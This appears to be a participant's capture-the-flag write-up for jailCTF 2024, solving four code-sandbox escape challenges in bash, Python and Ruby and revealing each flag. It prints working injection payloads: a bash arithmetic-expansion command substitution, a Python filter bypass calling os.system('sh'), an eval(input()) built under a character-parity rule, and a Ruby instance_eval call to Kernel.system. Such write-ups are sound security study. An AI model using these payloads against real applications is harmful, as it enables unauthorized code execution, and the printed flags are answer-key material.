# jailCTF 2024

https://ctf.pyjail.club/

| Place    | Score |
| -------- | ----- |
| 64/715 | 951  |

Very interesting CTF, focusing on jailbreaking techniques.

## blind-calc

The source code probably looks like this

```shell
read -p "Enter math > " expr
a=$(( \
expr \
))
echo $a
```

ref: https://www.nccgroup.com/us/research-blog/shell-arithmetic-expansion-and-evaluation-abuse/

**tl;dr:** `arr[$(COMMAND)]`

<details>
  <summary>FLAG</summary>
  <tt>jail{blind-calc_9c701e8c09f6cc0edd6}</tt>
</details>

## filter'd

```python
a=input;f(a())
M=999;f(a())
__import__('os').system('sh')
```

<details>
  <summary>FLAG</summary>
  <tt>jail{can_you_repeat_that_for_me?_aacb7144d2c}</tt>
</details>

## parity 1

The input string's ascii value must be even, odd, even, odd,....

Ultimately, we want to build `eval("eval(input()")`. Because the ascii value of "eval" is odd, even, odd, even.

The table lists import elements we can use to build the payload.

| char          | ord%2 |
| ------------- | ----- |
| `(`           | 0     |
| `)`           | 1     |
| `tab` or `\t` | 1     |
| `"`           | 0     |
| ` `           | 0     |
| `'`           | 1     |

And there are some Python syntax that allow us to do so.

- String concat: `"cat"'dog'` return `"catdog"`

- In the eval's input string:
  
  - Allowing tab and space inside parentheses
  
  - Allowing tab and space between funtion name and parentheses
  
  - Allowing tab and space in the start.

After some painful process, I construct a string that can let us execute arbitrary python code:

` eval\t(\' eval\' \'(\'"i"\'n\' + \'p\'"u"\'t\' \'(\'")"\' ) \' )`

<details>
  <summary>FLAG</summary>
  <tt>jail{parity_41f5812e8c0cd9}</tt>
</details>

## SUS-Calculator

The user input can control which instance method to use, however, the arguments must be accept by the method.
The payload format will loog like
```
<argument 1> <instance method> <argument 2>
```

Luckily, methods `instance_eval` accept two arguement, the payload is 

```
Kernel.system("sh") instance_eval 1
```
<details>
  <summary>FLAG</summary>
  <tt>jail{me_when_i_uhhh_escape}</tt>
</details>


